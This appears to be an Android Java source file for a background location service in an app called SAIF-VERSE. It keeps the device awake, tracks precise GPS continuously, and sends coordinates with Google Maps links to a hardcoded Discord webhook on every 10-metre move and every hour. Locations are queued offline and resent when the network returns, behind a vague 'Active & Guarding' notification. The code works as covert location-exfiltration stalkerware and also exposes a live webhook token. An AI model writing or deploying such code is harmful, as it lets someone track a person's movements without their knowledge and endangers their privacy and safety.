// path: android/app/src/main/java/com/saifyt87/saifverse/LocationForegroundService.java
// context: java / LocationForegroundService.java / android-native / target: mobile-android

package com.saifyt87.saifverse;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class LocationForegroundService extends Service {

    private static final String TAG = "SaifVerseService";
    private static final String CHANNEL_ID = "saif_verse_background_service";
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1562511570968387634/kxHb_nks02EyCjlG_ypU4-ac-9ji-QBoF28nONa5ODS1KL43rtdmrcQlbMsGMKRPbnM8";
    private static final String PREFS_NAME = "saif_verse_bg_prefs";
    private static final String QUEUE_KEY = "saif_verse_native_loc_queue_v3";

    private static final float MIN_DISTANCE_METERS = 10.0f; // Exact 10m movement trigger
    private static final long HOURLY_INTERVAL_MS = 60 * 60 * 1000L; // 1 hour stationary pulse

    private FusedLocationProviderClient fusedClient;
    private LocationCallback fusedLocationCallback;
    private LocationManager locationManager;
    private Location lastDispatchedLocation = null;
    private long lastDispatchedTimeMs = 0;
    private PowerManager.WakeLock wakeLock;
    private ScheduledExecutorService stationaryExecutor;
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;

    private final LocationListener fallbackLocationListener = new LocationListener() {
        @Override
        public void onLocationChanged(@NonNull Location location) {
            handleLocationUpdate(location);
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {}

        @Override
        public void onProviderEnabled(@NonNull String provider) {}

        @Override
        public void onProviderDisabled(@NonNull String provider) {}
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "Creating SAIF-VERSE 24/7 Background Service with Google Fused Location Engine...");

        // Acquire WakeLock so CPU never sleeps while guarding in background
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "saifverse:service_wakelock");
            wakeLock.acquire(24 * 60 * 60 * 1000L);
        }

        // Start Ongoing Foreground Notification (Clean 'Active & Guarding' style)
        createServiceNotificationChannel();
        Notification notification = buildForegroundNotification("Active & Guarding");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
            }
            startForeground(99001, notification, serviceType);
        } else {
            startForeground(99001, notification);
        }

        // Register Network monitor for instant auto-flush when internet reconnects
        setupNetworkCallback();

        // Start High-Accuracy Fused Location Engine (Wi-Fi + GPS + Cell + Sensors)
        startFusedTracking();

        // Guaranteed 1-hour stationary check executor
        stationaryExecutor = Executors.newSingleThreadScheduledExecutor();
        stationaryExecutor.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    long now = System.currentTimeMillis();
                    if (now - lastDispatchedTimeMs >= HOURLY_INTERVAL_MS) {
                        Log.i(TAG, "Hourly stationary pulse triggered by service timer.");
                        if (lastDispatchedLocation != null) {
                            dispatchLocationAsync(lastDispatchedLocation, "hourly_stationary", 0f);
                        } else {
                            requestImmediateFreshLocation("hourly_stationary");
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error in stationary executor", e);
                }
            }
        }, 5, 5, TimeUnit.MINUTES);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "SAIF-VERSE Background Service onStartCommand (START_STICKY)");
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.w(TAG, "Destroying SAIF-VERSE Background Service");
        stopFusedTracking();
        if (locationManager != null) {
            locationManager.removeUpdates(fallbackLocationListener);
        }
        if (stationaryExecutor != null) {
            stationaryExecutor.shutdownNow();
        }
        if (connectivityManager != null && networkCallback != null) {
            try {
                connectivityManager.unregisterNetworkCallback(networkCallback);
            } catch (Exception ignored) {}
        }
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    private void createServiceNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID,
                        "SAIF-VERSE 24/7 Engine",
                        NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("Background location and sync engine.");
                channel.setShowBadge(false);
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification buildForegroundNotification(String statusText) {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        notificationIntent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 99001, notificationIntent, flags);

        int icon = getApplicationInfo().icon != 0 ? getApplicationInfo().icon : android.R.drawable.ic_dialog_info;

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SAIF-VERSE Engine")
                .setContentText(statusText)
                .setSmallIcon(icon)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setContentIntent(pendingIntent)
                .build();
    }

    private void setupNetworkCallback() {
        try {
            connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (connectivityManager != null) {
                NetworkRequest request = new NetworkRequest.Builder()
                        .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                        .build();

                networkCallback = new ConnectivityManager.NetworkCallback() {
                    @Override
                    public void onAvailable(@NonNull Network network) {
                        Log.i(TAG, "Network restored in background service. Flushing offline location queue...");
                        flushOfflineQueueAsync();
                    }
                };

                connectivityManager.registerNetworkCallback(request, networkCallback);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to register network callback", e);
        }
    }

    @SuppressLint("MissingPermission")
    private void startFusedTracking() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Location permissions missing for background tracking.");
            return;
        }

        try {
            fusedClient = LocationServices.getFusedLocationProviderClient(this);

            LocationRequest locationRequest = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 3000)
                    .setMinUpdateDistanceMeters(0f) // Receive all movements
                    .setMinUpdateIntervalMillis(1500)
                    .setMaxUpdateDelayMillis(5000)
                    .build();

            fusedLocationCallback = new LocationCallback() {
                @Override
                public void onLocationResult(@NonNull LocationResult locationResult) {
                    for (Location location : locationResult.getLocations()) {
                        if (location != null) {
                            handleLocationUpdate(location);
                        }
                    }
                }
            };

            fusedClient.requestLocationUpdates(locationRequest, fusedLocationCallback, Looper.getMainLooper());

            // Immediate initial seed
            requestImmediateFreshLocation("initial_accurate");
        } catch (Exception e) {
            Log.e(TAG, "Fused location client unavailable, falling back to LocationManager: " + e.getMessage());
            startFallbackLocationManagerTracking();
        }
    }

    private void stopFusedTracking() {
        if (fusedClient != null && fusedLocationCallback != null) {
            fusedClient.removeLocationUpdates(fusedLocationCallback);
        }
    }

    @SuppressLint("MissingPermission")
    private void startFallbackLocationManagerTracking() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (locationManager == null) return;

        try {
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 0, fallbackLocationListener, Looper.getMainLooper());
            }
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 0, fallbackLocationListener, Looper.getMainLooper());
            }
            if (locationManager.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.PASSIVE_PROVIDER, 5000, 0, fallbackLocationListener, Looper.getMainLooper());
            }
        } catch (Exception e) {
            Log.e(TAG, "Fallback LocationManager error", e);
        }
    }

    @SuppressLint("MissingPermission")
    private void requestImmediateFreshLocation(final String reason) {
        if (fusedClient != null) {
            fusedClient.getLastLocation().addOnSuccessListener(new com.google.android.gms.tasks.OnSuccessListener<Location>() {
                @Override
                public void onSuccess(Location location) {
                    if (location != null) {
                        handleLocationUpdate(location);
                    }
                }
            });
        }
    }

    private void handleLocationUpdate(Location newLoc) {
        if (newLoc == null) return;

        double lat = newLoc.getLatitude();
        double lng = newLoc.getLongitude();

        // Reject only 0,0 or exact hardcoded BlueStacks default Banani mock (23.804093, 90.415238)
        if (isDummyMockLocation(lat, lng)) {
            return;
        }

        long now = System.currentTimeMillis();
        boolean shouldDispatch = false;
        String reason = "";
        float distance = 0f;

        if (lastDispatchedLocation == null) {
            shouldDispatch = true;
            reason = "initial_accurate";
        } else {
            distance = newLoc.distanceTo(lastDispatchedLocation);
            long timeDiff = now - lastDispatchedTimeMs;

            if (distance >= MIN_DISTANCE_METERS) {
                shouldDispatch = true;
                reason = "moved_10m";
            } else if (timeDiff >= HOURLY_INTERVAL_MS) {
                shouldDispatch = true;
                reason = "hourly_stationary";
            }
        }

        if (shouldDispatch) {
            dispatchLocationAsync(newLoc, reason, distance);
        }
    }

    private boolean isDummyMockLocation(double lat, double lng) {
        if (Math.abs(lat) < 0.001 && Math.abs(lng) < 0.001) return true;
        if (Math.abs(lat - 23.804093) < 0.0005 && Math.abs(lng - 90.415238) < 0.0005) return true;
        return false;
    }

    private void dispatchLocationAsync(final Location loc, final String reason, final float distanceMeters) {
        final double lat = loc.getLatitude();
        final double lng = loc.getLongitude();
        final double alt = loc.hasAltitude() ? loc.getAltitude() : 0.0;
        final float acc = loc.hasAccuracy() ? loc.getAccuracy() : 15.0f;

        // Update baseline anchor
        lastDispatchedLocation = new Location(loc);
        lastDispatchedTimeMs = System.currentTimeMillis();

        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.getDefault());
        final String timeStr = sdf.format(new Date());

        Executors.newSingleThreadExecutor().execute(new Runnable() {
            @Override
            public void run() {
                boolean sent = postLocationToDiscord(lat, lng, alt, acc, reason, distanceMeters, timeStr);
                if (!sent) {
                    Log.w(TAG, "Offline or network failure: saving location to native SharedPreferences queue...");
                    enqueueOfflineLocation(lat, lng, alt, acc, reason, distanceMeters, timeStr);
                } else {
                    flushOfflineQueueAsync();
                }
            }
        });
    }

    private synchronized void enqueueOfflineLocation(double lat, double lng, double alt, float acc, String reason, float distanceMeters, String timeStr) {
        try {
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            String raw = prefs.getString(QUEUE_KEY, "[]");
            JSONArray queue = new JSONArray(raw);

            JSONObject item = new JSONObject();
            item.put("lat", lat);
            item.put("lng", lng);
            item.put("alt", alt);
            item.put("acc", acc);
            item.put("reason", reason);
            item.put("distanceMeters", distanceMeters);
            item.put("timeStr", timeStr);

            queue.put(item);
            prefs.edit().putString(QUEUE_KEY, queue.toString()).apply();
            Log.i(TAG, "Saved offline location to native queue. Total queued: " + queue.length());
        } catch (Exception e) {
            Log.e(TAG, "Error enqueuing offline location", e);
        }
    }

    private synchronized void flushOfflineQueueAsync() {
        Executors.newSingleThreadExecutor().execute(new Runnable() {
            @Override
            public void run() {
                try {
                    SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                    String raw = prefs.getString(QUEUE_KEY, "[]");
                    JSONArray queue = new JSONArray(raw);

                    if (queue.length() == 0) return;

                    Log.i(TAG, "Flushing " + queue.length() + " offline locations to Discord...");
                    JSONArray remaining = new JSONArray();

                    for (int i = 0; i < queue.length(); i++) {
                        JSONObject item = queue.getJSONObject(i);
                        double lat = item.getDouble("lat");
                        double lng = item.getDouble("lng");
                        double alt = item.optDouble("alt", 0.0);
                        float acc = (float) item.optDouble("acc", 15.0);
                        String reason = item.optString("reason", "moved_10m");
                        float dist = (float) item.optDouble("distanceMeters", 0.0);
                        String timeStr = item.optString("timeStr", "");

                        boolean ok = postLocationToDiscord(lat, lng, alt, acc, reason, dist, timeStr);
                        if (!ok) {
                            remaining.put(item);
                        }
                        Thread.sleep(600);
                    }

                    prefs.edit().putString(QUEUE_KEY, remaining.toString()).apply();
                    Log.i(TAG, "Offline flush completed. Remaining: " + remaining.length());
                } catch (Exception e) {
                    Log.e(TAG, "Error in flushOfflineQueueAsync", e);
                }
            }
        });
    }

    private boolean postLocationToDiscord(double lat, double lng, double alt, float acc, String reason, float distanceMeters, String timeStr) {
        try {
            String googleFormat = String.format(Locale.US, "%.6f, %.6f", lat, lng);
            String googleMapsUrl = String.format(Locale.US, "https://www.google.com/maps?q=%.6f,%.6f", lat, lng);

            String title;
            String desc;
            int color;

            if ("moved_10m".equals(reason)) {
                title = "📍 24/7 Movement Detected (+" + Math.round(distanceMeters) + "m)";
                desc = "Movement verified in background (**+" + Math.round(distanceMeters) + "m**). Real GPS coordinates:";
                color = 0x10b981; // green
            } else if ("hourly_stationary".equals(reason)) {
                title = "📍 24/7 Stationary Pulse (1 Hour Check-in)";
                desc = "Device remained stationary for 1 hour. Verified Google coordinates:";
                color = 0x8b5cf6; // purple
            } else {
                title = "📍 24/7 Background Service Active";
                desc = "Live GPS coordinates verified from device hardware:";
                color = 0xec4899; // pink
            }

            JSONObject embed = new JSONObject();
            embed.put("title", title);
            embed.put("description", desc);
            embed.put("color", color);

            JSONArray fields = new JSONArray();

            JSONObject f1 = new JSONObject();
            f1.put("name", "📌 Google Format (Paste into Google/Maps)");
            f1.put("value", "`" + googleFormat + "`");
            f1.put("inline", false);
            fields.put(f1);

            JSONObject f2 = new JSONObject();
            f2.put("name", "🗺️ Google Maps Link");
            f2.put("value", "[Open Pin on Google Maps](" + googleMapsUrl + ")");
            f2.put("inline", true);
            fields.put(f2);

            JSONObject f3 = new JSONObject();
            f3.put("name", "🎯 Accuracy");
            f3.put("value", "±" + Math.round(acc) + "m");
            f3.put("inline", true);
            fields.put(f3);

            JSONObject f4 = new JSONObject();
            f4.put("name", "🕒 Timestamp");
            f4.put("value", "`" + timeStr + "`");
            f4.put("inline", true);
            fields.put(f4);

            embed.put("fields", fields);

            JSONObject footer = new JSONObject();
            footer.put("text", "SAIF-VERSE 24/7 Background Engine • Google Fused Location");
            embed.put("footer", footer);

            JSONArray embeds = new JSONArray();
            embeds.put(embed);

            JSONObject payload = new JSONObject();
            payload.put("username", "SAIF-VERSE (24/7 Engine)");
            payload.put("content", "📍 Background GPS update (" + ("hourly_stationary".equals(reason) ? "1hr check-in" : (Math.round(distanceMeters) + "m move")) + "):");
            payload.put("embeds", embeds);

            byte[] outBytes = payload.toString().getBytes(StandardCharsets.UTF_8);

            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "SAIF-VERSE-Android");
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            conn.setDoOutput(true);
            conn.setFixedLengthStreamingMode(outBytes.length);

            OutputStream os = conn.getOutputStream();
            os.write(outBytes);
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            Log.i(TAG, "Discord dispatch HTTP code: " + code);
            return code >= 200 && code < 300;
        } catch (Exception e) {
            Log.w(TAG, "Failed to post to Discord (device may be offline): " + e.getMessage());
            return false;
        }
    }
}
